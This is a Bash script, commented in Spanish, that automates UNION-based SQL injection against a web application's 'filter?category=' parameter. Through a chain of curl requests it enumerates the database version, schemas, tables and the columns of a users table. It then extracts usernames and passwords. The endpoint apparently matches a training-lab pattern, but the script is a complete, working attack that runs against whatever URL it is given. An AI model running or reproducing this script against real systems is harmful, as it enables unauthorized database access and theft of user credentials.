#!/bin/bash

#Colores
gyC="\e[0;37m\033[1m"
yC="\e[0;33m\033[1m"
bC="\e[0;34m\033[1m"
gC="\e[0;32m\033[1m"
rC="\e[0;31m\033[1m"
eC="\033[0m\e[0m"

#Inyecciones
version="'+UNION+SELECT+'MVersion',version()--"
bdd="'+UNION+SELECT+'BDD_Actual',current_database()--"
esquemas="'+UNION+SELECT+'Esquema',TABLE_SCHEMA+FROM+INFORMATION_SCHEMA.TABLES--"
tablas="'+UNION+SELECT+'TTabla',TABLE_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA='public'--"
columnasp1="'+UNION+SELECT+'CColumna',COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='"
columnasp2="'--"
credenciales=""

[ ! $# -eq 1 ] && echo -e "\n${yC}[+] ${gyC}Uso: ${gC}$0 ${bC}<url>${eC}\n" && exit 1
url=${1%/}

respuesta=$(curl -s -i $url)
echo -e "\n${yC}[+] ${gyC}Realizando peticion:\n\t${bC}${url}${eC}"
if ! echo -e "${respuesta}" | grep "200" >/dev/null ; then echo -e "${rC}[!] ${gyC}Verifica la URL proporcionada${eC}\n";exit 1; fi

echo -e "\n${yC}[+] ${gyC}Inyeccion para obtencion de version:\n\t${rC}${version}${eC}"
echo -e "${yC}[+] ${gyC}Realizando peticion:\n\t${bC}${url}${gyC}/filter?category=${rC}${version}${eC}"
v=$(curl -s -i -X GET $url"/filter?category="${version} | grep ">MVersion" -A1 | grep -P -o "<td>\K[^<]*" )
echo -e "${yC}[+] ${gyC}Version: ${gC}${v}${eC}"

echo -e "\n${yC}[+] ${gyC}Inyeccion para obtencion de esquemas:\n\t${rC}${esquemas}${eC}"
echo -e "${yC}[+] ${gyC}Realizando peticion:\n\t${bC}${url}${gyC}/filter?category=${rC}${esquemas}${eC}"
e=$(curl -s -i -X GET $url"/filter?category="${esquemas} | grep "Esquema" -A1 | grep -P -o "<td>\K[^<]*" )
echo -e "${yC}[+] ${gyC}Esquemas:${gC}"
echo -e "${e}" | awk '{print "\t"$0}'

echo -e "\n${yC}[+] ${gyC}Inyeccion para obtencion de tablas:\n\t${rC}${tablas}${eC}"
echo -e "${yC}[+] ${gyC}Realizando peticion:\n\t${bC}${url}${gyC}/filter?category=${rC}${tablas}${eC}"
t=$(curl -s -i -X GET $url"/filter?category="${tablas} | grep "TTabla" -A1 | grep -P -o "<td>\K[^<]*" )
tusers=$(echo -e "${t}" | grep "users")
echo -e "${yC}[+] ${gyC}Tablas:${gC}"
echo -e "${t}" | awk '{print "\t"$0}'

echo -e "\n${yC}[+] ${gyC}Inyeccion para obtencion de columnas de la tabla ${gC}'${tusers}'${gyC}:\n\t${rC}${columnasp1}${tusers}${columnasp2}${eC}"
echo -e "${yC}[+] ${gyC}Realizando peticion:\n\t${bC}${url}${gyC}/filter?category=${rC}${columnasp1}${tusers}${columnasp2}${eC}"
c=$(curl -s -i -X GET $url"/filter?category="${columnasp1}${tusers}${columnasp2} | grep "CColumna" -A1 | grep -P -o "<td>\K[^<]*" )
echo -e "${yC}[+] ${gyC}Columnas:${gC}"
echo -e "${c}" | awk '{print "\t"$0}'

c_user=$(echo -e "${c}" | grep -i "user")
c_pass=$(echo -e "${c}" | grep -i "pass")
credenciales="'UNION+SELECT+'CREDENCIALES',CONCAT(${c_user},':',${c_pass})+FROM+${tusers}--"
echo -e "\n${yC}[+] ${gyC}Inyeccion para obtencion de credenciales de la tabla ${gC}'${tusers}'${gyC}:\n\t${rC}${credenciales}${eC}"
echo -e "${yC}[+] ${gyC}Realizando peticion:\n\t${bC}${url}${gyC}/filter?category=${rC}${credenciales}${eC}"
cr=$(curl -s -i -X GET $url"/filter?category="${credenciales} | grep "CREDENCIALES" -A1 | grep -P -o "<td>\K[^<]*" )
echo -e "${yC}[+] ${gyC}Credenciales:${gC}"
echo -e "${cr}" | awk '{print "\t"$0}'


#echo -e "\n${yC}[+] ${gyC}Inyeccion para obtencion de credenciales:\n\t${rC}${credenciales}${eC}"

